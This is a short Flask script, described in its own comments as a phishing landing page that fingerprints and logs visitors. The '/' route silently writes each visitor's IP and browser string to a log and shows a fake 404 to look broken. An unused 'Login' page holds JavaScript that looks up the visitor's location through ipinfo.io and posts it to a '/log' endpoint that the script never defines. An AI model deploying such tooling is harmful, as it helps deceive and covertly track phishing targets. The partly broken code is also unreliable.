 # Log visitor info (IP, browser, location)
# These tools will simulate a phishing landing page with basic device fingerprinting and logging.
#!/usr/bin/env python3
from flask import Flask, request, render_template_string
from flask import Flask, request
import datetime
import os

app = Flask(__name__)

LOG_FILE = "phishing/visitors.log"

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
</head>
<body>
  <h1>Welcome</h1>
  <script>
    fetch("https://ipinfo.io/json")
      .then(res => res.json())
      .then(data => {
        fetch("/log", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(data)
        });
      });
  </script>
</body>
</html>
"""

@app.route('/')
def track():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = f"[{now}] IP: {ip}, Agent: {user_agent}\n"
    print(log_entry.strip())

    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

    return "<h1>404 Not Found</h1>", 404  # Looks like a broken page

if __name__ == "__main__":
    os.makedirs("phishing", exist_ok=True)
    app.run(host="0.0.0.0", port=5000)
